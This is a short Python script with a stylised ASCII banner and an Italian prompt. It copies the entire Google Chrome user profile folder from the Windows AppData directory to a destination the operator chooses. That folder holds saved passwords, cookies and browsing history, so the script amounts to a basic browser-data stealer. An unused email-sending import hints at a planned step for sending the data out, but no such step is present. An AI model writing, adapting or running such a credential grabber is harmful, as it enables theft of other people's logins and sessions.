import shutil, os, smtplib
#from email.message import EmailMessage

print(" _______                       .__                .__                                 ")
print(" \      \ _____  ______   ____ |  |   ____   ____ |  |_________  ____   _____   ____  ")
print(" /   |   \\__  \ \____ \ /  _ \|  | _/ __ \_/ ___\|  |  \_  __ \/  _ \ /     \_/ __ \ ")
print("/    |    \/ __ \|  |_> >  <_> )  |_\  ___/\  \___|   Y  \  | \(  <_> )  Y Y  \  ___/ ")
print("\____|__  (____  /   __/ \____/|____/\___  >\___  >___|  /__|   \____/|__|_|  /\___  >")
print("        \/     \/|__|                    \/     \/     \/                   \/     \/ ")

src = os.environ['USERPROFILE'] + r"\AppData\Local\Google\Chrome"
dst = input("Percorso destinazione: ")

shutil.copytree(src, dst + r"\Chrome")
